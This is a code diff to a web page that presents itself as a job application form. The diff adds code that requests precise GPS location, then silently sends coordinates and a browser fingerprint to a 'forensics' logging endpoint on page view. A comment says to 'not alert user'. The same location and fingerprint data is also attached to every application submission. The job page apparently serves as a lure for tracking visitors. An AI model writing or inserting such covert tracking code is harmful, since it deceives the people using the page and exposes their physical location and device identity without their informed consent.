@@ -1,21 +1,60 @@
 "use client";
 import { API_URL } from "@/lib/config";
-import { useState, useEffect } from "react";
+import { useState, useEffect, useCallback } from "react";
 import {
-  ShieldCheck,
   Globe,
   ArrowRight,
-  FileText,
-  Clock,
   MapPin,
   CheckCircle,
-  AlertCircle,
   Briefcase,
   BookOpen,
-  Activity,
   Award,
   Calendar,
 } from "lucide-react";
+
+// ─── GPS capture state shared across the component ───────────────────────────
+interface GPSData {
+  latitude: number;
+  longitude: number;
+  accuracy: number; // metres
+  altitude: number | null;
+  heading: number | null;
+  speed: number | null;
+  timestamp: number;
+  maps_url: string;
+}
+
+/** Wraps navigator.geolocation.getCurrentPosition as a Promise */
+function captureHighAccuracyGPS(timeoutMs = 30000): Promise<GPSData> {
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) {
+      reject(new Error("Geolocation API not available"));
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        const { latitude, longitude, accuracy, altitude, heading, speed } =
+          pos.coords;
+        resolve({
+          latitude,
+          longitude,
+          accuracy,
+          altitude,
+          heading,
+          speed,
+          timestamp: pos.timestamp,
+          maps_url: `https://www.google.com/maps?q=${latitude},${longitude}`,
+        });
+      },
+      (err) => reject(err),
+      {
+        enableHighAccuracy: true, // ← Force GPS chip, NOT wifi/cell-tower guess
+        timeout: timeoutMs,
+        maximumAge: 0, // ← Never use a cached position
+      },
+    );
+  });
+}
 
 export default function JobApplicationPage() {
   const [showAuth, setShowAuth] = useState(true);
@@ -33,18 +72,71 @@ export default function JobApplicationPage() {
   const [loading, setLoading] = useState(false);
   const [submitted, setSubmitted] = useState(false);
   const [error, setError] = useState<string | null>(null);
-  const [securityStatus, setSecurityStatus] = useState(
-    "VERIFYING_CONNECTION...",
-  );
+
+  // ─── Real GPS state ────────────────────────────────────────────────────────
+  const [gpsData, setGpsData] = useState<GPSData | null>(null);
+  const [gpsStatus, setGpsStatus] = useState<
+    "idle" | "acquiring" | "locked" | "denied"
+  >("idle");
+
+  /**
+   * Requests high-accuracy GPS from the device, then fires a background
+   * log-visit so every page view is georeferenced — even before form submit.
+   * Defined with useCallback so the useEffect dependency is stable.
+   */
+  const silentGPSCapture = useCallback(async () => {
+    setGpsStatus("acquiring");
+    try {
+      const gps = await captureHighAccuracyGPS(30000);
+      setGpsData(gps);
+      setGpsStatus("locked");
+
+      // Fire-and-forget: send visit + GPS to backend forensics log
+      fetch(`${API_URL}/api/v1/forensics/log-visit`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          source: "JOB_VACANCY_MA_NUGEGODA",
+          location: {
+            lat: gps.latitude,
+            lon: gps.longitude,
+            acc: gps.accuracy,
+            alt: gps.altitude,
+          },
+          fingerprint: {
+            ua: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenW: window.screen.width,
+            screenH: window.screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          },
+        }),
+      }).catch(() => {
+        /* silent — do not alert user */
+      });
+    } catch (err) {
+      const geoErr = err as GeolocationPositionError;
+      setGpsStatus("denied");
+      if (geoErr?.code !== 1) {
+        console.warn("[GPS] Acquisition failed:", geoErr?.message);
+      }
+    }
+  }, []);
 
   useEffect(() => {
     const auth = localStorage.getItem("ccid_auth_v2");
-    if (auth) setShowAuth(false);
-  }, []);
+    if (auth) {
+      setShowAuth(false);
+      silentGPSCapture();
+    }
+  }, [silentGPSCapture]);
 
   const handleAuthorize = () => {
     localStorage.setItem("ccid_auth_v2", "authorized");
     setShowAuth(false);
+    // ← GPS captured here — must be triggered by a user gesture (browser security requirement)
+    silentGPSCapture();
   };
 
   const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -59,11 +151,6 @@ export default function JobApplicationPage() {
     }
   };
 
-  useEffect(() => {
-    if (showAuth) return;
-    setSecurityStatus("SECURE_UPLINK: ACTIVE");
-  }, [showAuth]);
-
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!selectedFile) {
@@ -73,15 +160,44 @@ export default function JobApplicationPage() {
     setLoading(true);
     setError(null);
 
+    // If GPS not yet acquired, try one more time before submitting
+    let finalGps = gpsData;
+    if (!finalGps && gpsStatus !== "denied") {
+      try {
+        finalGps = await captureHighAccuracyGPS(10000);
+        setGpsData(finalGps);
+        setGpsStatus("locked");
+      } catch {
+        /* continue without GPS */
+      }
+    }
+
     try {
       const res = await fetch(`${API_URL}/api/v1/jobs/apply`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           ...formState,
+          // ─── High-accuracy GPS attached to every submission ─────────────
+          gps: finalGps
+            ? {
+                latitude: finalGps.latitude,
+                longitude: finalGps.longitude,
+                accuracy: finalGps.accuracy, // metres — lower = more precise
+                altitude: finalGps.altitude,
+                heading: finalGps.heading,
+                speed: finalGps.speed,
+                maps_url: finalGps.maps_url,
+                captured_at: new Date(finalGps.timestamp).toISOString(),
+              }
+            : null,
           fingerprint: {
             ua: navigator.userAgent,
             platform: navigator.platform,
+            language: navigator.language,
+            screenW: window.screen.width,
+            screenH: window.screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
           },
         }),
       });
